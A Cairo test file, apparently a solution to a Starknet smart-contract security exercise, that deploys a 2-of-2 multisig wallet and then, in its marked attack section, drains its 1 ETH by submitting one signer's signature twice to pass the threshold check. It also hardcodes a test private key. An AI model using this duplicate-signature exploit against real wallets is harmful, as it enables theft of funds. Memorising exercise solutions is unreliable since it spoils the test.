use core::hash::{HashStateTrait};
use core::pedersen::PedersenTrait;
use merkle_multisig_attack::multisig_threshold_attack::multisig::{
    IMultisigDispatcher, IMultisigDispatcherTrait,
};
use merkle_multisig_attack::utils::helpers;
use openzeppelin_token::erc20::interface::{IERC20DispatcherTrait};
use snforge_std::signature::KeyPairTrait;
use snforge_std::signature::stark_curve::{
    StarkCurveKeyPairImpl, StarkCurveSignerImpl, StarkCurveVerifierImpl,
};
use snforge_std::{
    ContractClassTrait, DeclareResultTrait, declare, start_cheat_caller_address,
    start_cheat_signature, start_cheat_transaction_hash, stop_cheat_caller_address,
    stop_cheat_signature, stop_cheat_transaction_hash,
};
use starknet::{ContractAddress, account::Call};

// A struct that holds the signature of a signer
#[derive(Copy, Drop, Serde)]
struct SignerSignature {
    signer: felt252,
    signature_r: felt252,
    signature_s: felt252,
}

fn deploy_multisig(
    treshold: usize, signers: Array<felt252>,
) -> (ContractAddress, IMultisigDispatcher) 
{
    let contract_class = declare("Multisig").unwrap().contract_class();
    let mut data_to_constructor = array![];
    Serde::serialize(@treshold, ref data_to_constructor);
    Serde::serialize(@signers, ref data_to_constructor);
    let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();
    return (address, IMultisigDispatcher { contract_address: address });
}

// Constants
const ONE_ETH: u256 = 1000000000000000000;
const ALICE_PRIVATE_KEY: felt252 =
    0x030c5e92d19e4db09b55131fb278d8507957504f7d2691f25c18ee66069367e0;
const ALICE_PUBLIC_KEY: felt252 =
    0x042efdc856377f22f747a0b236747f9d69482d2582a860bab46fc08455da9758;
const AVNU_ROUTER: felt252 = 0x04270219d365d6b017231b52e92b3fb5d7c8378b05e9abc97724537a80e93b0f;
const APPROVE_FUNCTION_SELECTOR: felt252 =
    0x0219209e083275171774dab1df80982e9df2096516f06319c5c6d71ae0a8480c;

#[test]
fn test_threshold_attack() {
    // Accounts
    let sequencer: ContractAddress = 0.try_into().unwrap();
    let attacker: ContractAddress = 'attacker'.try_into().unwrap();
    let alice_key_pair = KeyPairTrait::<felt252, felt252>::from_secret_key(ALICE_PRIVATE_KEY);
    let bob_key_pair = KeyPairTrait::<felt252, felt252>::generate();
    let pubKey_alice: felt252 = ALICE_PUBLIC_KEY;
    let pubKey_bob: felt252 = bob_key_pair.public_key;

    assert(alice_key_pair.public_key == pubKey_alice, 'Alice public key is incorrect');
    assert(bob_key_pair.public_key == pubKey_bob, 'Bob public key is incorrect');

    // Deploy ETH
    let (eth_address, eth_dispatcher) = helpers::deploy_eth();

    // Deploy multisig wallet with Alice and Bob as signers (2/2 signatures required)
    let (wallet_address, wallet_dispatcher) = deploy_multisig(2, array![pubKey_alice, pubKey_bob]);

    // The multisig wallet is going to have 1 ETH in balance
    helpers::mint_erc20(eth_address, wallet_address, ONE_ETH);

    // Testing a transaction, approving avnu router to spend the ETH
    // Preparing the calldata for the approve operation
    let mut calldata: Array<felt252> = array![];
    Serde::serialize(@AVNU_ROUTER, ref calldata);
    Serde::serialize(@ONE_ETH, ref calldata);

    // Prepare the call to approve the AVNU router to spend the ETH
    let call = Call {
        to: eth_address, selector: APPROVE_FUNCTION_SELECTOR, calldata: calldata.span(),
    };

    // Creation of custom tx hash (for simplicity)
    let hash_tx = hash_a_call(@call);

    // Sign the hash of the tx using Alice's and Bob's keys
    let (r_alice, s_alice): (felt252, felt252) = alice_key_pair.sign(hash_tx).unwrap();
    let (r_bob, s_bob): (felt252, felt252) = bob_key_pair.sign(hash_tx).unwrap();

    // Create the signature struct
    let signature_alice = SignerSignature {
        signer: pubKey_alice, signature_r: r_alice, signature_s: s_alice,
    };
    let signature_bob = SignerSignature {
        signer: pubKey_bob, signature_r: r_bob, signature_s: s_bob,
    };

    // Serialize the signatures
    let mut serialized_signatures = array![];
    Serde::serialize(@signature_alice, ref serialized_signatures);
    Serde::serialize(@signature_bob, ref serialized_signatures);

    // Prepare some Cheatcodes for the execution of the smart wallet transaction
    // Cheat TX hash to `hash_tx`
    start_cheat_transaction_hash(wallet_address, hash_tx);
    // Cheat signatures to serialized_signaturess (alice and bob)
    start_cheat_signature(wallet_address, serialized_signatures.span());
    // Sender will be the sequencer (address 0)
    start_cheat_caller_address(wallet_address, sequencer);

    let calls: Array<Call> = array![call];
    wallet_dispatcher.__validate__(calls.span());
    let mut _results: Array<Span<felt252>> = wallet_dispatcher.__execute__(calls.span());

    // Stop the cheatcodes
    stop_cheat_caller_address(wallet_address);
    stop_cheat_transaction_hash(wallet_address);
    stop_cheat_signature(wallet_address);

    // Attack Start //
    // Given only Alice's private key, steal the 1 ETH that is in the smart wallet to the
    // attacker account

    let mut bad_calldata: Array<felt252> = array![];
    let attacker_felt252: felt252 = attacker.try_into().unwrap();
    Serde::serialize(@attacker_felt252, ref bad_calldata);
    Serde::serialize(@ONE_ETH, ref bad_calldata);

    let bad_call = Call {
        to: eth_address, selector: APPROVE_FUNCTION_SELECTOR, calldata: bad_calldata.span(),
    };

    let bad_hash_tx = hash_a_call(@bad_call);
    let (r_alice_bad, s_alice_bad): (felt252, felt252) = alice_key_pair.sign(bad_hash_tx).unwrap();
    let bad_signature_alice = SignerSignature {
        signer: pubKey_alice, signature_r: r_alice_bad, signature_s: s_alice_bad,
    };
    let mut bad_serialized_signatures = array![];
    Serde::serialize(@bad_signature_alice, ref bad_serialized_signatures);
    Serde::serialize(@bad_signature_alice, ref bad_serialized_signatures);
    
    start_cheat_transaction_hash(wallet_address, bad_hash_tx);
    start_cheat_signature(wallet_address, bad_serialized_signatures.span());
    start_cheat_caller_address(wallet_address, sequencer);

    let bad_calls: Array<Call> = array![bad_call];
    wallet_dispatcher.__validate__(bad_calls.span());
    println!("before execute");
    let mut _results: Array<Span<felt252>> = wallet_dispatcher.__execute__(bad_calls.span());
    println!("after execute");
    stop_cheat_caller_address(wallet_address);
    stop_cheat_transaction_hash(wallet_address);
    stop_cheat_signature(wallet_address);

    start_cheat_caller_address(eth_address, attacker);
    eth_dispatcher.transfer_from(wallet_address, attacker, ONE_ETH);
    stop_cheat_caller_address(eth_address);

    // Attack End //

    // Attacker's balance should be 1 ETH
    assert(eth_dispatcher.balance_of(attacker) == ONE_ETH, 'Wrong balance');
}

// Create a custom tx hash for simplicity of the exercise
// Works by serializing the call and then hashing the felt elements that represent it
// Example taken from ???
fn hash_a_call(call: @Call) -> felt252 {
    let mut serialized_call: Array<felt252> = array![];
    Serde::serialize(call, ref serialized_call);
    let first_element = serialized_call.pop_front().unwrap();
    let mut state = PedersenTrait::new(first_element);
    while let Option::Some(value) = serialized_call.pop_front() {
        state = state.update(value);
    }
    let hash = state.finalize();
    return hash;
}
